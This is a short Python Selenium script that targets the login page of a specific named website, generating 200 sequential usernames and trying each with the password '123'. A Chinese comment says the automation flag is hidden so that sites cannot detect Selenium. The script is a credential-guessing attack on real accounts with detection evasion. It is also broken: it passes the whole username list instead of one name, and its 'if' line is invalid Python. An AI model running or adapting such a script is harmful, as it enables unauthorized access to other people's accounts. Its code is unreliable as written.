from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
#driver = webdriver.Chrome()
options = webdriver.ChromeOptions()
        # 此步骤很重要，设置为开发者模式，防止被各大网站识别出来使用了Selenium
options.add_experimental_option('excludeSwitches', ['enable-automation']) 
driver = webdriver.Chrome(options=options)
driver.get("https://dhse.gdg.com.cn/Login/login")
# driver.find_element_by_css_selector(".SignFlow-accountInput.Input-wrapper input").send_keys("123456789")

# driver.find_element_by_css_selector(".SignFlow-passwordInput.Input-wrapper input").send_keys("256398")

logname = []
for i in range(200):
    logname.append(str(120080+i))

for names in logname:
    element = driver.find_element_by_name('loginname').send_keys(logname) #189对应123密码
    pwd = driver.find_element_by_id('loginpwd').send_keys('123')
    time.sleep(1)
    sub1 = driver.find_element_by_css_selector('#btnlogin').click() #登录
    time.sleep(2)
    if address = driver.current_url == 'https://dhse.gdg.com.cn/Login/login':
        continue


time.sleep(3)